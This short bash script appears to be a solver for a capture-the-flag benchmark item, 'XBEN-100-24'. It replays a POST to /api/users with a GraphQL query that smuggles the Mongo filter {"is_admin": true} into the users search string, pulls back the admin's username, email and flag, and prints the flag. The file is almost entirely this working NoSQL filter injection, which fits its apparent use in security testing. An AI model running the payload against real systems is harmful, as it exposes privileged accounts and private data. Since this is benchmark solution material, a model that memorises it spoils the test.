#!/usr/bin/env bash
# XBEN-100-24 — NoSQL filter injection via GraphQL. Proxy-mode twin. The users
# search passes its string to a Mongo filter, so `{"is_admin": true}` returns
# the admin record — username, email and flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben100p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/api/users' \
  --set 'header.Content-Type=application/json' \
  --set 'json.query={ users(search: "{\"is_admin\": true}") { username email flag } }' >/dev/null
print_flag
